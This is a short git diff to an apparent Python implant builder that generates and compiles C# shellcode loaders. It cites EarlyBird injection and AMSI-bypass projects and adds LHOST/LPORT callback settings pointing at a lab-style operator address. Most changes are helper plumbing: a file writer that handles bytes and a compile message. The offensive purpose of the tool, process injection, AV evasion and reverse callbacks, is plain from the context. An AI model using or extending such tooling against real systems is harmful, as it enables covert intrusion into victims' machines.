@@ -7,6 +7,9 @@ import subprocess
 # https://github.com/Kara-4search/EarlyBirdInjection_CSharp
 # https://github.com/0xB455/AmsiBypass/blob/master/Class1.cs
 
+LHOST = "192.168.49.65"
+LPORT = "443"
+
 DLL_IMPORT = {
   "VirtualAlloc": "",
   "CreateThread": "",
@@ -595,15 +598,21 @@ class Implant:
     pass
 
 
-def cs_write(filename, code):
-   f = open(filename, "w")
-   f.write(code)
+def write_file(filename, content):
+   flag = "w"
+
+   if type(content) is bytes:
+      flag = "wb"
+
+   f = open(filename, flag)
+   f.write(content)
    print("Wrote to: " + filename)
    f.close()
 
 def cs_compile(filename, flags=""):
   cmd = f"mcs {flags} {filename}"
   os.system(cmd)
+  print("Compiled " + filename.replace(".cs",".exe"))
 
 # Other injection types
 #          //  IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
